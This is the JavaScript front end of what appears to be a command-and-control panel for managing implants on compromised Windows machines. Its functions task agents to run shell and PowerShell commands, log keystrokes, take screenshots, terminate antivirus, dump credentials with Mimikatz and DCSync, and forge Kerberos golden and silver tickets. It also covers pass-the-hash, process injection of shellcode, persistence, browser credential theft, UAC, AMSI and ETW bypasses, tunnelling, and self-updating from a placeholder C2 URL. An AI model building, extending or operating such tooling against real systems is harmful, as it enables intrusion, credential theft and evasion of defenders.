let currentTab = 'overview';

function isAgentDetailPage() {
    return !!document.getElementById('tab-overview');
}

function switchTab(tab) {
    currentTab = tab;
    document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
    const tabEl = document.getElementById('tab-' + tab);
    if (!tabEl) return;
    tabEl.classList.remove('hidden');
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('bg-indigo-600', 'text-white');
        btn.classList.add('text-slate-600', 'dark:text-slate-400', 'hover:bg-slate-100', 'dark:hover:bg-slate-700');
    });
    const active = document.querySelector('.tab-btn[data-tab="' + tab + '"]');
    if (active) {
        active.classList.remove('text-slate-600', 'dark:text-slate-400', 'hover:bg-slate-100', 'dark:hover:bg-slate-700');
        active.classList.add('bg-indigo-600', 'text-white');
    }
    if (tab === 'tasks') checkPendingTasks();
}
window.switchTab = switchTab;

document.addEventListener('DOMContentLoaded', function() {
    if (!isAgentDetailPage()) return;
    switchTab('overview');
    setInterval(() => { if (currentTab === 'tasks') checkPendingTasks(); }, 5000);
    if (typeof agentId !== 'undefined') fetchRPortFwdStatus(agentId);
});

function refreshTasks() {
    checkPendingTasks();
}

function checkPendingTasks() {
    const pending = document.querySelectorAll('.task-card[data-status="pending"]');
    if (pending.length === 0) { document.getElementById('tasks-live').classList.add('hidden'); return; }
    document.getElementById('tasks-live').classList.remove('hidden');
    apiFetch('/agents/' + agentId + '/tasks')
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const newList = doc.getElementById('tasks-list');
            const oldList = document.getElementById('tasks-list');
            if (newList && oldList) oldList.innerHTML = newList.innerHTML;
        })
        .catch(() => showToast(__('Failed to refresh task list'), 'error'));
}

function sendQuickCommand(agentId, cmd) {
    document.getElementById('cmd-result').innerHTML = '<div class="text-yellow-400">' + __('Executing') + ': ' + escapeHtml(cmd) + '...</div>';
    apiFetch('/agents/' + agentId + '/command', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'command=' + encodeURIComponent(cmd) + '&shell=cmd.exe' })
        .then(data => { if (data.success) setTimeout(() => fetchResult(agentId, data.task_id, 'cmd-result'), 1500); })
        .catch(() => {});
}

function sendQuickCommandPS(agentId, cmd) {
    document.getElementById('cmd-result').innerHTML = '<div class="text-yellow-400">' + __('Executing PowerShell') + ': ' + escapeHtml(cmd) + '...</div>';
    apiFetch('/agents/' + agentId + '/command', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'command=' + encodeURIComponent(cmd) + '&shell=powershell.exe' })
        .then(data => { if (data.success) setTimeout(() => fetchResult(agentId, data.task_id, 'cmd-result'), 1500); })
        .catch(() => {});
}

function fetchResult(agentId, taskId, targetId) {
    apiFetch('/agents/' + agentId + '/tasks/' + taskId)
        .then(data => {
            const el = document.getElementById(targetId);
            if (!el) return;
            if (data.error) { el.innerHTML = '<span class="text-red-400">' + escapeHtml(data.error) + '</span>'; return; }
            if (data.status === 'completed') { el.innerHTML = data.result ? '<pre class="whitespace-pre-wrap">' + escapeHtml(data.result) + '</pre>' : '<span class="text-emerald-400">' + __('Completed') + '</span>'; }
            else if (data.status === 'failed') { el.innerHTML = '<span class="text-red-400">' + escapeHtml(data.error || __('Failed')) + '</span>'; }
            else { el.innerHTML = '<span class="text-yellow-400">' + __('Waiting') + '...</span>'; setTimeout(() => fetchResult(agentId, taskId, targetId), 3000); }
        }).catch(() => setTimeout(() => fetchResult(agentId, taskId, targetId), 3000));
}

function requestPS(agentId) {
    apiFetch('/agents/' + agentId + '/ps', { method: 'POST' }).then(data => { if (data.success) showToast(__('Process list requested'), 'success'); }).catch(() => {});
}
function requestScreenshot(agentId) {
    apiFetch('/agents/' + agentId + '/screenshot', { method: 'POST' }).then(data => { if (data.success) showToast(__('Screenshot requested'), 'success'); }).catch(() => {});
}
function requestScreenshotWindow(agentId) {
    apiFetch('/agents/' + agentId + '/screenshot_window', { method: 'POST' }).then(data => { if (data.success) showToast(__('Window screenshot requested'), 'success'); }).catch(() => {});
}

function startKeyloggerQuick(agentId) {
    apiFetch('/agents/' + agentId + '/keylogger/start', { method: 'POST' }).then(data => { if (data.success) showToast(__('Keylogger started'), 'success'); }).catch(() => {});
}
function stopKeyloggerQuick(agentId) {
    apiFetch('/agents/' + agentId + '/keylogger/stop', { method: 'POST' }).then(data => { if (data.success) showToast(__('Keylogger stopped'), 'success'); }).catch(() => {});
}
function dumpKeyloggerQuick(agentId) {
    apiFetch('/agents/' + agentId + '/keylogger/dump', { method: 'POST' }).then(data => { if (data.success) showToast(__('Keylogger dump requested'), 'success'); }).catch(() => {});
}

function killAVQuick(agentId) { if (!confirm(__('Terminate AV processes?'))) return; apiFetch('/agents/' + agentId + '/kill_av', { method: 'POST' }).catch(() => {}); showToast(__('Terminate AV sent'), 'success'); }
function elevateQuick(agentId) { apiFetch('/agents/' + agentId + '/elevate', { method: 'POST' }).then(d => { if (d.success) showToast(__('Elevate sent'), 'success'); }).catch(() => {}); }
function credsQuick(agentId) { apiFetch('/agents/' + agentId + '/creds', { method: 'POST' }).then(d => { if (d.success) showToast(__('Creds dump requested'), 'success'); }).catch(() => {}); }
function injectQuick(agentId) { const pid = prompt(__('Target PID:')); if (!pid) return; apiFetch('/agents/' + agentId + '/inject', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'pid=' + encodeURIComponent(pid) + '&tech=&shellcode=' }).catch(() => {}); showToast(__('Inject sent'), 'success'); }
function lateralQuick(agentId) { const spec = prompt(__('Lateral spec:'), 'winrm|127.0.0.1||whoami'); if (!spec) return; apiFetch('/agents/' + agentId + '/lateral', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'spec=' + encodeURIComponent(spec) }).catch(() => {}); showToast(__('Lateral sent'), 'success'); }
function spawnQuick(agentId) {
    const target = prompt(__('Target executable:'), 'rundll32.exe');
    if (!target) return;
    const technique = prompt(__('Technique (CreateRemoteThread or QueueUserAPC):'), 'CreateRemoteThread');
    if (!technique) return;
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.bin,.raw';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData();
        fd.append('target', target); fd.append('technique', technique); fd.append('shellcode', file);
        apiFetch('/agents/' + agentId + '/spawn', { method: 'POST', body: fd }).then(d => showToast(d.message || __('Spawn sent'), 'success')).catch(() => {});
    };
    input.click();
}
function socksQuick(agentId) { const port = prompt(__('SOCKS5 port:'), '1080'); apiFetch('/agents/' + agentId + '/socks', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'port=' + encodeURIComponent(port || '1080') }).catch(() => {}); showToast(__('SOCKS sent'), 'success'); }
function tokenListProcsQuick(agentId) { apiFetch('/agents/' + agentId + '/token/list', { method: 'POST' }).then(d => { if (d.success) showToast(__('Enum tokens sent'), 'success'); }).catch(() => {}); }
function tokenWhoamiQuick(agentId) { apiFetch('/agents/' + agentId + '/token/whoami', { method: 'POST' }).then(d => { if (d.success) showToast(__('Token whoami sent'), 'success'); }).catch(() => {}); }
function tokenRevertQuick(agentId) { apiFetch('/agents/' + agentId + '/token/revert', { method: 'POST' }).then(d => { if (d.success) showToast(__('Rev2Self sent'), 'success'); }).catch(() => {}); }
function suspendQuick(agentId) { const inp = document.getElementById('proc-target-' + agentId); const target = inp ? inp.value.trim() : ''; if (!target) { showToast(__('Enter PID or process name'), 'error'); return; } apiFetch('/agents/' + agentId + '/suspend', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'target=' + encodeURIComponent(target) }).catch(() => {}); showToast(__('Suspend sent'), 'success'); }
function resumeQuick(agentId) { const inp = document.getElementById('proc-target-' + agentId); const target = inp ? inp.value.trim() : ''; if (!target) { showToast(__('Enter PID or process name'), 'error'); return; } apiFetch('/agents/' + agentId + '/resume', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'target=' + encodeURIComponent(target) }).catch(() => {}); showToast(__('Resume sent'), 'success'); }

function addNote() {
    const display = document.getElementById('notes-display');
    const input = document.getElementById('notes-input');
    if (input.classList.contains('hidden')) {
        input.value = display.textContent.trim() === __('Click to add note') ? '' : display.textContent.trim();
        display.classList.add('hidden');
        input.classList.remove('hidden');
        input.focus();
    } else {
        const note = input.value.trim();
        apiFetch('/agents/' + agentId + '/note', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'notes=' + encodeURIComponent(note) })
            .then(() => { display.textContent = note || __('Click to add note'); display.classList.remove('hidden'); input.classList.add('hidden'); showToast(__('Note saved'), 'success'); })
            .catch(() => {});
    }
}

function deleteAgent(agentId) {
    apiFetch('/agents/' + agentId, { method: 'DELETE' })
        .then(data => {
            if (data && data.success === false) {
                showToast(data.error || __('Failed to delete agent'), 'error');
                return;
            }
            showToast(__('Agent deleted'), 'success');
            setTimeout(() => { window.location = '/agents'; }, 800);
        })
        .catch(err => showToast(String(err), 'error'));
}
window.deleteAgent = deleteAgent;

function cancelTask(agentId, taskId) {
    if (!confirm(__tf('Cancel task #{0}?', taskId))) return;
    apiFetch('/agents/' + agentId + '/tasks/' + taskId + '/cancel', { method: 'POST' })
        .then(data => { if (data.success) { showToast(__('Task cancelled'), 'success'); checkPendingTasks(); } else showToast(__tf('Cancel failed: {0}', data.error || ''), 'error'); })
        .catch(err => showToast(__tf('Request failed: {0}', err), 'error'));
}
function rerunTaskFromDetail(agentId, taskId) {
    apiFetch('/agents/' + agentId + '/task/' + taskId + '/rerun', { method: 'POST' })
        .then(data => { if (data.success) showToast(__('Task recreated'), 'success'); else showToast(__tf('Rerun failed: {0}', data.error || ''), 'error'); })
        .catch(err => showToast(__tf('Request failed: {0}', err), 'error'));
}

function confirmAction(message, callback) { if (confirm(message)) callback(); }

function showScreenshotModal(agentId, filename) {
    const modal = document.createElement('div');
    modal.className = 'fixed inset-0 bg-black/80 flex items-center justify-center z-[100] p-4';
    modal.innerHTML = '<div class="relative max-w-[95vw] max-h-[95vh] flex items-center justify-center"><img src="/screenshots/' + agentId + '/' + filename + '" class="max-w-[95vw] max-h-[90vh] w-auto h-auto object-contain rounded-2xl shadow-2xl" /><div class="fixed top-4 right-4 flex gap-2"><a href="/screenshots/' + agentId + '/' + filename + '" download class="bg-white hover:bg-slate-100 transition-colors text-xs px-4 h-9 flex items-center rounded-2xl border shadow">' + __('Download') + '</a><button onclick="this.closest(\'.fixed\').remove()" class="bg-white hover:bg-red-100 transition-colors text-xs px-4 h-9 flex items-center rounded-2xl border shadow">' + __('Close') + '</button></div></div>';
    document.body.appendChild(modal);
    modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
}

function showScreenshotDataUrl(src) {
    const modal = document.createElement('div');
    modal.className = 'fixed inset-0 bg-black/80 flex items-center justify-center z-[100] p-4';
    modal.innerHTML = '<div class="relative max-w-[95vw] max-h-[95vh] flex items-center justify-center"><img src="' + src + '" class="max-w-[95vw] max-h-[90vh] w-auto h-auto object-contain rounded-2xl shadow-2xl" /><button onclick="this.closest(\'.fixed\').remove()" class="fixed top-4 right-4 bg-white hover:bg-red-100 transition-colors text-xs px-4 h-9 flex items-center rounded-2xl border shadow">' + __('Close') + '</button></div>';
    document.body.appendChild(modal);
    modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
}

function kerberoastQuick(agentId) {
    apiFetch('/agents/' + agentId + '/kerberoast', { method: 'POST' }).then(d => showToast(d.message || __('Kerberoast requested'), 'success')).catch(() => {});
}
function mimikatzQuick(agentId) {
    const cmd = prompt(__('Mimikatz command:'), 'sekurlsa::logonpasswords');
    if (!cmd) return;
    apiFetch('/agents/' + agentId + '/mimikatz', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'command=' + encodeURIComponent(cmd) }).then(d => showToast('Mimikatz sent', 'success')).catch(() => {});
}
function executeAssemblyQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.exe,.dll,.net';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData(); fd.append('assembly', file);
        apiFetch('/agents/' + agentId + '/execute_assembly', { method: 'POST', body: fd }).then(d => showToast(d.message || __('Execute-assembly sent'), 'success')).catch(() => {});
    };
    input.click();
}
function bofQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.o,.obj,.coff';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const args = prompt(__('BOF arguments (space-separated):'), '') || '';
        const fd = new FormData(); fd.append('bof', file); fd.append('args', args);
        apiFetch('/agents/' + agentId + '/bof', { method: 'POST', body: fd }).then(d => showToast(d.message || __('BOF sent'), 'success')).catch(() => {});
    };
    input.click();
}
function powerPickQuick(agentId) {
    const script = prompt(__('PowerShell script to execute:'), 'Get-Process | Out-String');
    if (!script) return;
    apiFetch('/agents/' + agentId + '/powerpick', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'script=' + encodeURIComponent(script) }).then(d => showToast(d.message || __('PowerPick sent'), 'success')).catch(() => {});
}
function printNightmareQuick(agentId) {
    const dll = prompt(__('Full path to DLL on target:'), 'C:\\Windows\\Temp\\evil.dll');
    if (!dll) return;
    apiFetch('/agents/' + agentId + '/elevate/printnightmare', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'dll_path=' + encodeURIComponent(dll) }).then(d => showToast('PrintNightmare sent', 'success')).catch(() => {});
}
function fetchRPortFwdStatus(agentId) {
    apiFetch('/agents/' + agentId + '/rportfwd/status')
        .then(data => {
            const el = document.getElementById('rportfwd-status');
            if (!el) return;
            if (data.active) { el.innerHTML = '<div class="flex items-center justify-between"><span class="text-emerald-600 font-medium">' + __('Port') + ' ' + data.port + ' &rarr; ' + data.target + '</span><span class="text-xs text-slate-400">' + __('Active') + '</span></div>'; }
            else { el.innerHTML = '<span class="text-slate-400">' + __('Inactive') + '</span>'; }
        }).catch(() => {
            const el = document.getElementById('rportfwd-status');
            if (el) el.innerHTML = '<span class="text-slate-400">' + __('Inactive') + '</span>';
        });
}

function peloaderQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.dll';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData(); fd.append('dll', file);
        apiFetch('/agents/' + agentId + '/peloader', { method: 'POST', body: fd }).then(d => showToast(d.message || __('PE Loader sent'), 'success')).catch(() => {});
    };
    input.click();
}
function executeAssemblyForkRunQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.exe,.dll,.net';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData(); fd.append('assembly', file);
        apiFetch('/agents/' + agentId + '/execute_assembly_forkrun', { method: 'POST', body: fd }).then(d => showToast(d.message || __('Fork&Run sent'), 'success')).catch(() => {});
    };
    input.click();
}
function rportfwdRelayQuick(agentId) {
    const lport = prompt(__('Local listening port:'), '1081');
    if (!lport) return;
    const target = prompt(__('Forward target (host:port):'), '10.0.0.1:3389');
    if (!target) return;
    apiFetch('/agents/' + agentId + '/rportfwd/start', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'lport=' + encodeURIComponent(lport) + '&target=' + encodeURIComponent(target) })
        .then(d => showToast(d.message || __('rportfwd started'), 'success')).catch(() => {});
}
function dcsyncQuick(agentId) {
    const user = prompt(__('Target user:'), 'krbtgt');
    apiFetch('/agents/' + agentId + '/dcsync', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'user=' + encodeURIComponent(user || 'krbtgt') })
        .then(d => showToast(d.message || __('DCSync sent'), 'success')).catch(() => {});
}
function goldenTicketQuick(agentId) {
    const user = prompt(__('Username:')); if (!user) return;
    const domain = prompt(__('Domain:')); if (!domain) return;
    const sid = prompt(__('Domain SID:')); if (!sid) return;
    const hash = prompt(__('krbtgt NTLM hash:')); if (!hash) return;
    apiFetch('/agents/' + agentId + '/golden_ticket', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&sid=' + encodeURIComponent(sid) + '&krbtgt_hash=' + encodeURIComponent(hash) })
        .then(d => showToast(d.message || __('Golden ticket sent'), 'success')).catch(() => {});
}
function silverTicketQuick(agentId) {
    const user = prompt(__('Username:')); if (!user) return;
    const domain = prompt(__('Domain:')); if (!domain) return;
    const sid = prompt(__('Domain SID:')); if (!sid) return;
    const target = prompt(__('Target service (e.g. CIFS/SERVER):')); if (!target) return;
    const hash = prompt(__('Service RC4 hash:')); if (!hash) return;
    apiFetch('/agents/' + agentId + '/silver_ticket', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&sid=' + encodeURIComponent(sid) + '&target=' + encodeURIComponent(target) + '&rc4_hash=' + encodeURIComponent(hash) })
        .then(d => showToast(d.message || __('Silver ticket sent'), 'success')).catch(() => {});
}
function asreproastQuick(agentId) {
    apiFetch('/agents/' + agentId + '/asreproast', { method: 'POST' }).then(d => showToast(d.message || __('ASREP roast sent'), 'success')).catch(() => {});
}
function passTheHashQuick(agentId) {
    const user = prompt(__('Username:')); if (!user) return;
    const domain = prompt(__('Domain:')); if (!domain) return;
    const hash = prompt(__('NTLM hash:')); if (!hash) return;
    const target = prompt(__('Target (host:port, optional):')) || '';
    apiFetch('/agents/' + agentId + '/pass_the_hash', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&ntlm_hash=' + encodeURIComponent(hash) + '&target=' + encodeURIComponent(target) })
        .then(d => showToast(d.message || __('PTH sent'), 'success')).catch(() => {});
}
function passTheTicketQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.kirbi,.bin';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData(); fd.append('ticket', file);
        apiFetch('/agents/' + agentId + '/pass_the_ticket', { method: 'POST', body: fd }).then(d => showToast(d.message || __('PTT sent'), 'success')).catch(() => {});
    };
    input.click();
}
function persistenceQuick(agentId) {
    const methods = ["registry", "scheduled_task", "startup_folder", "wmi", "service", "image_file", "com_hijack", "dll_search_order"];
    const method = prompt(__('Persistence method:') + '\n' + methods.join(', '), 'registry');
    if (!method || !methods.includes(method)) return;
    const action = prompt(__('Action (add, list, remove):'), 'add');
    if (!action || !["add","list","remove"].includes(action)) return;
    if (action === 'list') {
        apiFetch('/agents/' + agentId + '/persistence', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=list' })
            .then(d => { if (d.success) showToast(__('Persistence list requested'), 'success'); }).catch(() => {});
        return;
    }
    let body = 'action=' + action + '&method=' + encodeURIComponent(method);
    if (action === 'add' || action === 'remove') {
        if (method === 'dll_search_order') {
            const dllPath = prompt(__('Full path to DLL on target:'), 'C:\\Windows\\Temp\\evil.dll');
            if (!dllPath) return;
            body += '&binary_path=' + encodeURIComponent(dllPath);
        } else {
            const binPath = prompt(__('Binary path (leave empty for current exe):'), '');
            if (binPath) body += '&binary_path=' + encodeURIComponent(binPath);
        }
    }
    apiFetch('/agents/' + agentId + '/persistence', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: body })
        .then(d => { if (d.success) showToast(__tf('Persistence {0} sent for {1}', action, method), 'success'); }).catch(() => {});
}

function browserStealQuick(agentId) {
    const browser = prompt(__('Browser (chrome, edge, firefox, all):'), 'all');
    if (!browser) return;
    apiFetch('/agents/' + agentId + '/browser_steal', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'browser=' + encodeURIComponent(browser) })
        .then(d => showToast(d.message || __('Browser steal sent'), 'success')).catch(() => {});
}
function uacBypassQuick(agentId, method) {
    const payload = prompt(__('Payload path (leave empty for current agent binary):'), window.location.origin + '/...');
    let body = 'method=' + encodeURIComponent(method);
    if (payload && payload.trim() !== '') body += '&payload=' + encodeURIComponent(payload.trim());
    apiFetch('/agents/' + agentId + '/uac_bypass', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: body })
        .then(d => { if (d.success) showToast(__tf('UAC bypass ({0}) sent', method), 'success'); }).catch(() => {});
}
function amsiBypassQuick(agentId) {
    apiFetch('/agents/' + agentId + '/amsi_bypass', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'} })
        .then(d => { if (d.success) showToast(__('AMSI bypass sent'), 'success'); }).catch(() => {});
}
function etwBypassQuick(agentId) {
    apiFetch('/agents/' + agentId + '/etw_bypass', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'} })
        .then(d => { if (d.success) showToast(__('ETW bypass sent'), 'success'); }).catch(() => {});
}
function selfUpdateQuick(agentId) {
    const url = prompt(__('Download URL for new agent:'), 'http://your-c2-server/path/to/new-agent.exe');
    if (!url) return;
    apiFetch('/agents/' + agentId + '/self_update', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'url=' + encodeURIComponent(url) })
        .then(d => { if (d.success) showToast(__('Self-update sent - agent will restart'), 'success'); }).catch(() => {});
}

function netCommandQuick(agentId, cmd) {
    document.getElementById('cmd-result').innerHTML = '<div class="text-yellow-400">' + __('Executing') + ': net ' + escapeHtml(cmd) + '...</div>';
    apiFetch('/agents/' + agentId + '/net', { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'command=' + encodeURIComponent(cmd) })
        .then(data => { if (data.success) setTimeout(() => fetchResult(agentId, data.task_id, 'cmd-result'), 1500); }).catch(() => {});
}
function netCommandQuickCustom(agentId) {
    const inp = document.getElementById('net-custom-' + agentId);
    const cmd = inp ? inp.value.trim() : '';
    if (!cmd) return;
    netCommandQuick(agentId, cmd);
}

async function toggleLock(agentId) {
    const indicator = document.getElementById('lock-indicator-' + agentId);
    if (!indicator) return;
    const isLocked = indicator.getAttribute('data-locked') === 'true';
    const url = isLocked ? '/agents/' + agentId + '/unlock' : '/agents/' + agentId + '/lock';
    try {
        const resp = await fetch(url, { method: 'POST' });
        const data = await resp.json();
        if (data.success) {
            showToast(isLocked ? __('Agent unlocked') : __('Agent locked'), 'success');
            if (isLocked) { indicator.innerHTML = ''; indicator.removeAttribute('data-locked'); }
            else { indicator.innerHTML = '<span class="text-xs bg-amber-100 text-amber-700 px-2 py-1 rounded-full"><i class="fa-solid fa-lock mr-1"></i>' + __('Locked') + '</span>'; indicator.setAttribute('data-locked', 'true'); }
        } else { showToast(__tf('Lock failed: {0}', data.error || ''), 'error'); }
    } catch (e) { showToast(__('Request failed'), 'error'); }
}

document.addEventListener('DOMContentLoaded', function() {
    if (!isAgentDetailPage() || typeof agentId === 'undefined') return;
    apiFetch('/api/collab/locks').then(d => {
        if (d.success && d.locks) {
            const lock = d.locks.find(l => l.agent_id === agentId);
            const indicator = document.getElementById('lock-indicator-' + agentId);
            if (lock && indicator) { indicator.innerHTML = '<span class="text-xs bg-amber-100 text-amber-700 px-2 py-1 rounded-full"><i class="fa-solid fa-lock mr-1"></i>' + lock.username + '</span>'; }
        }
    }).catch(() => showToast(__('Failed to fetch agent status'), 'error'));
    refreshAgentViewers(agentId);
    setInterval(() => refreshAgentViewers(agentId), 10000);
    window.addEventListener('collab:viewing_agent', function(e) {
        if (e.detail && e.detail.agent_id === agentId) refreshAgentViewers(agentId);
    });
});

async function refreshAgentViewers(agentId) {
    try {
        const resp = await fetch('/api/collab/agent-viewers/' + agentId);
        const data = await resp.json();
        const container = document.getElementById('agent-viewers-' + agentId);
        const label = document.getElementById('agent-viewers-label-' + agentId);
        if (!container || !label) return;
        const others = data.viewers ? data.viewers.filter(v => v.username !== window.currentUserDisplayName) : [];
        if (others.length > 0) { container.classList.remove('hidden'); label.textContent = others.map(v => v.username).join(', '); }
        else { container.classList.add('hidden'); }
    } catch(e) {}
}
